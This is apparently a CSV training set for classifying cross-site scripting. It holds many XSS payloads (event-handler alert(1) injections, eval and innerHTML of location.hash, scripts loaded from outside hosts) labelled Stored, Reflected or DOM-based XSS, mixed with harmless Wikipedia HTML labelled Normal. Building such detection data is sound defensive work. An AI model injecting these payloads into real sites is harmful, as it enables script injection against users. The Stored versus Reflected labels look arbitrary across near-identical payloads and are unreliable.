Sentence,Final_Label
"<svg draggable=""true"" ondragenter=""alert(1)"">test</svg>",Stored XSS
"<blink ondblclick=""alert(1)"">test</blink>",Reflected XSS
"<div class=""shortdescription nomobile noexcerpt noprint searchaux"" style=""display:none"">Intelligence demonstrated by machines </div>",Normal
"<script>  setTimeout(\\""writetitle()\\"",$\_GET\[\]) </script>",Stored XSS
"<link onmouseover=""alert(1)"">test</link>",Reflected XSS
"<table onmousemove=""alert(1)"">test</table>",Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<svg onmousedown=""alert(1)"">test</svg>",Stored XSS
<svg><sub onload=alert(1)></sub>,Stored XSS
<th onblur=alert(1) tabindex=1 id=x></th><input autofocus>,Reflected XSS
<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>,Stored XSS
<tbody onpointermove=alert(1)>XSS</tbody>,Reflected XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationstart=""alert(1)""></embed>",Stored XSS
"<style>:target {color:red;}</style><footer id=x style=""transition:color 1s"" ontransitionend=alert(1)></footer>",Reflected XSS
<body onpointerout=alert(1)>XSS</body>,Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<embed onbeforepaste=""alert(1)"" contenteditable>test</embed>",Stored XSS
<svg><progress onload=alert(1)></progress>,Stored XSS
<svg><keygen onload=alert(1)></keygen>,Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<style>:target {transform: rotate(180deg);}</style><svg id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></svg>",Stored XSS
"<script onmouseover=""alert(1)"">test</script>",Stored XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
 </li>,Normal
"<ul><li><a href=""/wiki/Discrete_mathematics"" title=""Discrete mathematics"">Discrete mathematics </a> </li>",Normal
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<nav draggable=""true"" ondragstart=""alert(1)"">test</nav>",Reflected XSS
	 </span> 2019 ,Normal
<STYLE>@import'http://.rocks/.css';</STYLE>,Stored XSS
"<li><a href=""/wiki/Synergetics_(Haken)"" title=""Synergetics (Haken)"">Synergetics </a> </li>",Normal
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationend=""alert(1)""></listing>",Reflected XSS
<dt id=x tabindex=1 onbeforeactivate=alert(1)></dt>,Reflected XSS
"<body onkeydown=""alert(1)"" contenteditable>test</body>",Reflected XSS
<svg><tbody onload=alert(1)></tbody>,Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<dt><a class=""reference internal"" href=""topics/exceptions.html""><span class=""doc"">Exceptions",Normal
"<style>@keyframes slidein {}</style><blink style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></blink>",Reflected XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=3"" title=""Edit section: Basics"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
"<li id=""cite_note-Hierarchical_control_system-181""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Hierarchical_control_system_181-0"">^ </a> </b> ",Normal
"<hgroup onkeydown=""alert(1)"" contenteditable>test</hgroup>",Reflected XSS
"<script onmouseover=""alert(1)"">test</script>",Stored XSS
"SRC=""test.xml"" ID=I",Stored XSS
"<script onmouseup=""alert(1)"">test</script>",Stored XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></script>",Stored XSS
"<svg onmouseout=""alert(1)"">test</svg>",Stored XSS
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationstart=""alert(1)""></source>",Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.sas.com/en_ae/solutions/ai.html"">""Artificial Intelligence Solutions, AI Solutions"" </a>. <i>www.sas.com </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=www.sas.com&amp;rft.atitle=Artificial+Intelligence+Solutions%2C+AI+Solutions&amp;rft_id=https%3A%2F%2Fwww.sas.com%2Fen_ae%2Fsolutions%2Fai.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<form><a href=""javascript:\u0061lert(1)"">X",Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<style>@keyframes slidein {}</style><ruby style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ruby>",Reflected XSS
"<abbr oncut=""alert(1)"" contenteditable>test</abbr>",Reflected XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<small onbeforepaste=""alert(1)"" contenteditable>test</small>",Reflected XSS
"<blink onbeforecut=""alert(1)"" contenteditable>test</blink>",Reflected XSS
<svg><noframes onload=alert(1)></noframes>,Stored XSS
 </p>,Normal
"<iframe draggable=""true"" ondragend=""alert(1)"">test</iframe>",Stored XSS
"<A HREF=""http://ha.ckers.org@google""></A>",Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<li><a class=""mw-selflink selflink"">Artificial intelligence </a> </li>",Normal
"<style>:target {color: red;}</style><article id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></article>",Reflected XSS
"<li><a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">Automated planning and scheduling </a> </li>",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<style>:target {color:red;}</style><summary id=x style=""transition:color 1s"" ontransitionend=alert(1)></summary>",Reflected XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<embed onmouseenter=""alert(1)"">test</embed>",Stored XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<style>@keyframes slidein {}</style><script style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></script>",Stored XSS
"<li><a href=""/wiki/Philosophy_of_chemistry"" title=""Philosophy of chemistry"">Chemistry </a> </li>",Normal
"<nextid onkeydown=""alert(1)"" contenteditable>test</nextid>",Reflected XSS
"<SCRIPT ="">"" SRC=""httx://.rocks/.js""></SCRIPT>",Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",Normal
<svg><dfn onload=alert(1)></dfn>,Stored XSS
"<li><a href=""/wiki/AI_takeover"" title=""AI takeover"">AI takeover </a> </li>",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
 </li>,Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
<svg><thead onload=alert(1)></thead>,Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
	 </span>,Normal
"Glossary </th> </tr><tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",Normal
"<option oncut=""alert(1)"" contenteditable>test</option>",Reflected XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<li onbeforecut=""alert(1)"" contenteditable>test</li>",Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<iframe onmouseout=""alert(1)"">test</iframe>",Stored XSS
"<li id=""cite_note-389""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-389"">^ </a> </b> ",Normal
"<picture draggable=""true"" ondragend=""alert(1)"">test</picture>",Reflected XSS
<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>,Reflected XSS
"<li id=""cite_note-Planning_as_search-187""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Planning_as_search_187-0"">^ </a> </b> ",Normal
"<a oncopy=""alert(1)"" contenteditable>test</a>",Reflected XSS
"	 </span> <span class=""reference-text"">",Normal
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationend=""alert(1)""></rt>",Reflected XSS
"<strike onmouseover=""alert(1)"">test</strike>",Reflected XSS
<a onpointerenter=alert(1)>XSS</a>,Reflected XSS
<iframe onblur=alert(1) id=x><input autofocus>,Stored XSS
"<iframe draggable=""true"" ondragleave=""alert(1)"">test</iframe>",Stored XSS
<svg onpointerleave=alert(1)>XSS</svg>,Stored XSS
"<li id=""cite_note-193""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-193"">^ </a> </b> ",Normal
"<li id=""cite_note-75""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-75"">^ </a> </b> ",Normal
"<tbody onmouseenter=""alert(1)"">test</tbody>",Reflected XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
 </p>,Normal
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<embed onbeforecopy=""alert(1)"" contenteditable>test</embed>",Stored XSS
"<title onmouseover=""alert(1)"">test</title>",Reflected XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<style>:target {color:red;}</style><aside id=x style=""transition:color 1s"" ontransitionend=alert(1)></aside>",Reflected XSS
<a onpointerup=alert(1)>XSS</a>,Reflected XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<div draggable=""true"" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>",Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<h1 onmousemove=""alert(1)"">test</h1>",Reflected XSS
"<figcaption onkeyup=""alert(1)"" contenteditable>test</figcaption>",Reflected XSS
<svg><blockquote onload=alert(1)></blockquote>,Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<label onkeydown=""alert(1)"" contenteditable>test</label>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><basefont id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></basefont>",Reflected XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<script onreadystatechange=alert(1)></script>,Stored XSS
"<style>:target {transform: rotate(180deg);}</style><img id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></img>",Reflected XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<script onclick=""alert(1)"">test</script>",Stored XSS
<pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>,Reflected XSS
"<SCRIPT ="">"" SRC=""httx://.rocks/.js""></SCRIPT>",Stored XSS
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<main onmouseenter=""alert(1)"">test</main>",Reflected XSS
<rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>,Reflected XSS
<embed id=x tabindex=1 onbeforedeactivate=alert(1)></embed><input autofocus>,Stored XSS
"<li><a href=""/wiki/Turing_test"" title=""Turing test"">Turing test </a> </li>",Normal
<svg id=x tabindex=1 onactivate=alert(1)></svg>,Stored XSS
"<li><a href=""/wiki/Imre_Lakatos"" title=""Imre Lakatos"">Imre Lakatos </a> </li>",Normal
<svg><rtc onload=alert(1)></rtc>,Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<embed src=1 onerror=alert(1) type=image/gif>,Stored XSS
"<iframe draggable=""true"" ondrag=""alert(1)"">test</iframe>",Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.channelnewsasia.com/news/commentary/artificial-intelligence-big-data-bias-hiring-loans-key-challenge-11097374"">""Commentary: Bad news. Artificial intelligence is biased"" </a>. <i>CNA </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=CNA&amp;rft.atitle=Commentary%3A+Bad+news.+Artificial+intelligence+is+biased&amp;rft_id=https%3A%2F%2Fwww.channelnewsasia.com%2Fnews%2Fcommentary%2Fartificial-intelligence-big-data-bias-hiring-loans-key-challenge-11097374&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>,Stored XSS
<iframe onpointerup=alert(1)>XSS</iframe>,Stored XSS
"<li><cite id=""CITEREFOudeyer2010"" class=""citation journal"">Oudeyer, P-Y. (2010). <a rel=""nofollow"" class=""external text"" href=""http://www.pyoudeyer.com/IEEETAMDOudeyer10.pdf"">""On the impact of robotics in behavioral and cognitive sciences: from insect navigation to human cognitive development"" </a> <span class=""cs1-format"">(PDF) ",Normal
</div>,Normal
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<frame onmousemove=""alert(1)"">test</frame>",Reflected XSS
<ruby id=x tabindex=1 onfocusin=alert(1)></ruby>,Reflected XSS
 ,Normal
"<object onbeforecut=""alert(1)"" contenteditable>test</object>",Stored XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"    <span class=""rst-current-version"" data-toggle=""rst-current-version"">",Normal
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",Normal
<param id=x tabindex=1 onactivate=alert(1)></param>,Reflected XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"tt  p://6	6.000146.0x7.147/""></A>",Stored XSS
"<style>:target {transform: rotate(180deg);}</style><center id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></center>",Reflected XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<object onbeforepaste=""alert(1)"" contenteditable>test</object>",Stored XSS
"<div draggable=""true"" ondrag=""alert(1)"">test</div>",Reflected XSS
<animatetransform onpointerdown=alert(1)>XSS</animatetransform>,Reflected XSS
"<embed onkeypress=""alert(1)"" contenteditable>test</embed>",Stored XSS
